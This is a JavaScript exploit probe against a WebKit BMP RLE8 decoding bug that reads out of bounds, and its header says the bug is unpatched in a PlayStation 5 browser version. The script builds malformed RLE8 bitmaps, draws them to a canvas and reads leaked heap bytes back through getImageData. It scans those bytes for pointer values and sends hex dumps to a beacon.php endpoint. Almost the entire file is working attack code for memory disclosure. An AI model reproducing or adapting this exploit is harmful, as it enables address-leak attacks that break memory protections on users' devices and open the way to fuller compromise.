// PROBE P570: BMP RLE8 OOB read — heap pointer leak via canvas getImageData
//
// Bug: BMPImageReader::readCurrentPixel() uses m_coord.x() * bytesPerPixel
// as offset from m_decodedOffset. In RLE absolute mode after a delta command,
// m_decodedOffset = run data start, but m_coord.x() is the absolute position.
// For X > run_data_size, this reads OOB from the heap.
//
// Fixed in WK-1400 (upstream). PS5 14.10 uses WK-1200 = UNPATCHED.
//
// Technique:
//   1. Build RLE8 BMP in JS with identity palette (entry[i] = RGB(i,0,i))
//   2. Row 1: delta to X=DX, then absolute fill with marker byte 0xAA
//   3. Due to bug, absolute mode reads from heap (OOB) instead of run data
//   4. drawImage to canvas, getImageData reads leaked bytes as red channel
//   5. Scan for pointer patterns (6+ non-zero non-marker bytes in 8-byte window)
//
// Three variants: DX=512, DX=768, DX=256 for different OOB reach depths.

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function B(tag, body) {
    var msg = 'P570-' + tag;
    if (body !== undefined) msg += '-' + body;
    try {
      new Image().src = BASE + '/beacon.php?tag=' + encodeURIComponent(msg) +
        '&t=' + (Date.now() - T0);
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT', navigator.userAgent.substring(0, 60));

  var W = 1024, H = 2;
  var PAL = 256 * 4;
  var HDR = 14 + 40 + PAL; // 1078 bytes

  function buildBMP(dx, marker) {
    var rle = [];

    // Row 0 (bottom row in BMP, = canvas y=1): fill with index 0
    rle.push(0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0x04, 0x00);
    rle.push(0x00, 0x00); // EOL

    // Row 1 (top row in BMP, = canvas y=0): delta to X=dx
    var rem = dx;
    while (rem > 0) {
      var step = rem > 255 ? 255 : rem;
      rle.push(0x00, 0x02, step, 0x00);
      rem -= step;
    }

    // Absolute mode: fill remaining (W - dx) pixels
    // Due to the bug, these reads happen at heap offset dx from the run data start
    var toFill = W - dx;
    var filled = 0;
    while (filled < toFill) {
      var chunk = toFill - filled;
      if (chunk > 255) chunk = 255;
      if (chunk >= 3) {
        rle.push(0x00, chunk);
        for (var i = 0; i < chunk; i++) rle.push(marker);
        if (chunk % 2 !== 0) rle.push(0x00); // pad odd runs
      } else {
        rle.push(chunk, marker); // encoded mode for small runs
      }
      filled += chunk;
    }
    rle.push(0x00, 0x00); // EOL
    rle.push(0x00, 0x01); // End of Bitmap

    var fSize = HDR + rle.length;
    var bmp = new Uint8Array(fSize);
    var p = 0;

    // BMP file header
    bmp[p++] = 0x42; bmp[p++] = 0x4D; // "BM"
    bmp[p++] = fSize & 0xFF; bmp[p++] = (fSize >> 8) & 0xFF;
    bmp[p++] = (fSize >> 16) & 0xFF; bmp[p++] = (fSize >> 24) & 0xFF;
    p += 4; // reserved
    bmp[p++] = HDR & 0xFF; bmp[p++] = (HDR >> 8) & 0xFF;
    bmp[p++] = (HDR >> 16) & 0xFF; bmp[p++] = (HDR >> 24) & 0xFF;

    // DIB header (BITMAPINFOHEADER = 40 bytes)
    bmp[p++] = 40; p += 3;
    bmp[p++] = W & 0xFF; bmp[p++] = (W >> 8) & 0xFF; p += 2;
    bmp[p++] = H & 0xFF; bmp[p++] = (H >> 8) & 0xFF; p += 2;
    bmp[p++] = 1; bmp[p++] = 0;   // planes
    bmp[p++] = 8; bmp[p++] = 0;   // 8bpp
    bmp[p++] = 1; p += 3;          // BI_RLE8
    p += 4; // image size (can be 0 for RLE)
    p += 4; // X ppm
    p += 4; // Y ppm
    bmp[p++] = 0; bmp[p++] = 1; p += 2; // 256 colors used
    p += 4; // important colors

    // Identity palette: entry[i] = (B=i, G=0, R=i, reserved=0)
    // Red channel = blue channel = leaked byte value
    for (var i = 0; i < 256; i++) {
      bmp[p++] = i;    // Blue
      bmp[p++] = 0;    // Green
      bmp[p++] = i;    // Red
      bmp[p++] = 0;    // Reserved
    }

    // RLE data
    for (var i = 0; i < rle.length; i++) bmp[p++] = rle[i];

    return { data: bmp, fileSize: fSize, oobStart: dx };
  }

  function runVariant(dx, marker, label, callback) {
    try {
      var bmpInfo = buildBMP(dx, marker);
      B(label + '-BUILD', 'fs=' + bmpInfo.fileSize + ',dx=' + dx);

      var blob = new Blob([bmpInfo.data], { type: 'image/bmp' });
      var url = URL.createObjectURL(blob);
      var img = new Image();

      img.onload = function() {
        B(label + '-LOADED', img.width + 'x' + img.height);

        var canvas = document.createElement('canvas');
        canvas.width = W;
        canvas.height = H;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0);

        // Read attack row (canvas y=0 = BMP row 1)
        var d = ctx.getImageData(0, 0, W, 1).data;

        // Collect red channel values from delta position to end
        var bytes = [];
        var markerCount = 0, oobCount = 0, zeroCount = 0;
        for (var x = dx; x < W; x++) {
          var r = d[x * 4]; // Red channel = leaked byte via identity palette
          bytes.push(r);
          if (r === marker) markerCount++;
          else if (r === 0) zeroCount++;
          else oobCount++;
        }

        B(label + '-STAT', 'mark=' + markerCount + ',oob=' + oobCount + ',zero=' + zeroCount);

        // If we see oobCount > 0, some bytes are NOT our marker = OOB heap data!
        if (oobCount > 0) {
          B(label + '-OOB-DETECTED', oobCount);

          // Hex dump first 256 bytes
          for (var c = 0; c < bytes.length && c < 256; c += 32) {
            var h = '';
            for (var j = c; j < c + 32 && j < bytes.length; j++) h += hx(bytes[j]);
            B(label + '-D' + c, h);
          }

          // Find 8-byte pointer patterns
          var ptrs = [];
          for (var i = 0; i < bytes.length - 7; i++) {
            var nz = 0;
            for (var b = 0; b < 8; b++) {
              var v = bytes[i + b];
              if (v !== 0 && v !== marker) nz++;
            }
            if (nz >= 5) {
              var ph = '';
              for (var b = 7; b >= 0; b--) ph += hx(bytes[i + b]); // LE → big-endian hex
              ptrs.push('+' + i + ':0x' + ph);
              i += 7;
            }
          }
          B(label + '-PTRS', ptrs.length + ' found');
          for (var pi = 0; pi < ptrs.length && pi < 20; pi++) {
            B(label + '-P' + pi, ptrs[pi]);
          }
        } else {
          // All bytes are marker or zero — BMP loaded but no OOB read
          B(label + '-NO-OOB', 'allMarkerOrZero');

          // Dump first 64 bytes anyway for diagnosis
          var h = '';
          for (var j = 0; j < 64 && j < bytes.length; j++) h += hx(bytes[j]);
          B(label + '-SAMPLE', h);
        }

        // Control row: canvas y=1 (BMP row 0) should be all zeros
        var ctlData = ctx.getImageData(0, 1, W, 1).data;
        var ctlNZ = 0;
        for (var x = 0; x < W; x++) { if (ctlData[x * 4] !== 0) ctlNZ++; }
        B(label + '-CTL', 'nz=' + ctlNZ);

        URL.revokeObjectURL(url);
        if (callback) setTimeout(callback, 300);
      };

      img.onerror = function() {
        B(label + '-IMG-ERR', 'decode-failed');
        URL.revokeObjectURL(url);
        if (callback) setTimeout(callback, 300);
      };

      img.src = url;
    } catch(e) {
      B(label + '-ERR', e.name + ':' + (e.message || '').substring(0, 40));
      if (callback) setTimeout(callback, 300);
    }
  }

  // Run three variants with different delta values and markers
  runVariant(512, 0xAA, 'V1', function() {
    runVariant(768, 0xBB, 'V2', function() {
      runVariant(256, 0xCC, 'V3', function() {
        // Also try a very simple non-RLE BMP to confirm BMP loading works at all
        try {
          var sw = 4, sh = 2;
          var sRle = [];
          for (var r = 0; r < sh; r++) {
            sRle.push(sw, r + 1);
            sRle.push(0x00, 0x00);
          }
          sRle.push(0x00, 0x01);
          var sFs = HDR + sRle.length;
          var sBmp = new Uint8Array(sFs);
          var q = 0;
          sBmp[q++] = 0x42; sBmp[q++] = 0x4D;
          sBmp[q++] = sFs & 0xFF; sBmp[q++] = (sFs >> 8) & 0xFF;
          sBmp[q++] = (sFs >> 16) & 0xFF; sBmp[q++] = (sFs >> 24) & 0xFF;
          q += 4;
          sBmp[q++] = HDR & 0xFF; sBmp[q++] = (HDR >> 8) & 0xFF;
          sBmp[q++] = (HDR >> 16) & 0xFF; sBmp[q++] = (HDR >> 24) & 0xFF;
          sBmp[q++] = 40; q += 3;
          sBmp[q++] = sw; q += 3;
          sBmp[q++] = sh; q += 3;
          sBmp[q++] = 1; sBmp[q++] = 0;
          sBmp[q++] = 8; sBmp[q++] = 0;
          sBmp[q++] = 1; q += 3;
          q += 16;
          sBmp[q++] = 0; sBmp[q++] = 1; q += 2;
          q += 4;
          for (var i = 0; i < 256; i++) {
            sBmp[q++] = i; sBmp[q++] = i; sBmp[q++] = i; sBmp[q++] = 0;
          }
          for (var i = 0; i < sRle.length; i++) sBmp[q++] = sRle[i];

          var sBlob = new Blob([sBmp], { type: 'image/bmp' });
          var sUrl = URL.createObjectURL(sBlob);
          var sImg = new Image();
          sImg.onload = function() {
            B('SIMPLE-OK', sImg.width + 'x' + sImg.height);
            B('DONE');
          };
          sImg.onerror = function() {
            B('SIMPLE-ERR');
            B('DONE');
          };
          sImg.src = sUrl;
        } catch(e) {
          B('SIMPLE-EX', e.name);
          B('DONE');
        }
      });
    });
  });

})();
